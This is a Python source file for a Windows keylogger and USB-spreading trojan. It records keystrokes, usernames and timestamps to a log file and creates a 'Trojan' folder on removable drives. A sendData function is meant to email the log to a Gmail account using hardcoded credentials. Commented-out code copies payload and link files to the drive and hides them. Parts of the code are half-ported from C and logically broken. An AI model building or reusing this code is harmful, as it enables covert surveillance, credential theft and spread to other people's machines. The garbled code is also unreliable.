import win32console as consl
from os.path import exists
import time
import os
import win32api
import win32con
import win32file


def freeConsl(): 
	consl.FreeConsole()


def setGetAge():
	ageTemp = 0

	file_exists = exists("Record.log")

	if file_exists:
		record_file = open("Record.log", 'r')
		fileline = record_file.readline()
		ageTemp = fileline
	else:
		ageTemp = ageTemp + 1
		record_file = open("Record.log", 'a')
		record_file.write(str(ageTemp))
		record_file.close()

	return ageTemp


def checkRecordSize():
	noOfLines = 0;

	log_file = open("Record.log", 'r')
	for line in log_file:
		noOfLines = noOfLines + 1

	if noOfLines < 0:
		return False
	else:
		return True


def sendData():
	command = 'Transmit smtp://smtp.gmail.com:587 -v --mail-from \"null53cur17y@gmail.com\" --mail-rcpt \"null53cur17y@gmail.com\" --ssl -u null53cur17y@gmail.com:vltjpkqimmwxigin -T \"Record.log\" -k --anyauth'
	os.popen(command)


def logUserTime():
    record_file = open("Record.log", "a")
    username = os.getlogin()
    current_date_time = time.ctime()
    record_file.write("\n" + username +":" + "\t" + current_date_time + "\n")
    record_file.close()


def getRemovableDisk():
    drives = [i for i in win32api.GetLogicalDriveStrings().split('\x00') if i]
    drive = [d for d in drives if win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE]
    return drive[-1]


def logKey():
	ch = 0
	i = 0 
	j = 0
	while(j < 10):
		ch = 1
		while(ch < 5):
			for i in range(10):
				i = i+1
				ch = ch+1
				if(win32api.GetAsyncKeyState(ch) == -32767):
					file = open("Record.log", "a")
					file.write(str(ch))
					file.close()
			time.sleep(1)
		j = j+1


def infectDrive(driveLetter):
    folderPath = driveLetter + "\\" + "Trojan"
    print(folderPath)

    if not os.path.exists(folderPath):
    	os.makedirs(folderPath)

    #     char run[100]={""}
    #     strcat(run, folderPath)
    #     strcat(run, "\\")
    #     strcat(run, RUN_FILE_NAME)

    #     CopyFile(RUN_FILE_NAME, run, 0)


    #     char net[100]={""}
    #     strcat(net, folderPath)
    #     strcat(net, "\\")
    #     strcat(net, EMAIL_SENDER_FILE_NAME)

    #     CopyFile(EMAIL_SENDER_FILE_NAME, net, 0)


    #     char infect[100]={""}
    #     strcat(infect, folderPath)
    #     strcat(infect, "\\")
    #     strcat(infect, INFECT_FILE_NAME)

    #     CopyFile(INFECT_FILE_NAME, infect, 0)

    #     char runlnk[100]={""}
    #     strcat(runlnk, folderPath)
    #     strcat(runlnk, "\\")
    #     strcat(runlnk, RUN_LINK_NAME)

    #     CopyFile(RUN_LINK_NAME, runlnk, 0)

    #     char infectlnk[100]={""}
    #     strcat(infectlnk, folderPath)
    #     strcat(infectlnk, "\\")
    #     strcat(infectlnk, INFECT_LINK_NAME)

    #     CopyFile(INFECT_LINK_NAME, infectlnk, 0)


    #     char hideCommand[100] = {""}
    #     strcat(hideCommand, "attrib +s +h +r ")
    #     strcat(hideCommand, folderPath)

    #     WinExec(hideCommand, SW_HIDE)
    # else:
    #     srand(time(0))
    #     int random = rand()

    #     if(random%2==0 || random%3==0 || random%7==0):
    #         return 

    # char infectlnkauto[100] = {driveLetter}
    # char* randomName = getRandomName()
    # strcat(infectlnkauto, randomName)
    # CopyFile(INFECT_LINK_NAME, infectlnkauto, 0)











def main():
	allDrives = 0
	szLogicalDrives = 0;
	age = 0

	#freeConsl()

	age  = setGetAge()
	#print(age)

	no = checkRecordSize()
	#print(no)

	if checkRecordSize():
		for x in range(3):
			time.sleep(x * 2)
			if(os.popen('ping www.google.com -n 1')):

				#sendData()

				print ("Connection ok")
				time.sleep(2)
				os.remove("Record.log")
				break

	age  = setGetAge()

	if age <= 5:
		logUserTime()
	
	driveLetter = getRemovableDisk()
	#print(driveLetter)

	while(1):
		#if age <= 5:
			#logKey()
		#else:
			#time.sleep(5000)

		driveLetter = getRemovableDisk()
		
		if driveLetter != '0':
			infectDrive(driveLetter)		




if __name__ == '__main__':
	main()
